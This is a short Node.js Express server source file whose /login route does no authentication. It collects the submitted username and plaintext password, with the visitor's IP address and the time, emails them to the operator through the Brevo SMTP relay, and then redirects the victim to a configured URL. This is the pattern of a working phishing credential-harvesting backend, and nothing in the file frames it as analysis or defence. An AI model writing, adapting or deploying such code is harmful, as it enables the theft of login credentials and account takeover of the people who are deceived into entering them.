const express = require("express");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

// Root route for health check
app.get("/", (req, res) => {
    res.send("Backend is running");
});

// Login route
app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    const timestamp = new Date().toLocaleString();
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    if (Array.isArray(ip)) ip = ip[0]; // normalize if array

    // ✅ Use Brevo SMTP instead of Gmail
    const transporter = nodemailer.createTransport({
        host: "smtp-relay.brevo.com",
        port: 587,
        secure: false, // TLS
        auth: {
            user: process.env.BREVO_USER, // your Brevo login
            pass: process.env.BREVO_PASS  // your Brevo SMTP key
        }
    });

    const mailOptions = {
        from: process.env.BREVO_USER,
        to: process.env.BREVO_USER, // or another email you want to receive notifications at
        subject: "New Login Detected",
        text: `A login just occurred.

Username: ${username}
Password: ${password}

Time: ${timestamp}
IP Address: ${ip}`
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log("Email sent successfully");
        res.redirect(process.env.REDIRECT_URL);
    } catch (error) {
        console.error("Email error:", error);
        res.status(500).send("Something went wrong. Please try again.");
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});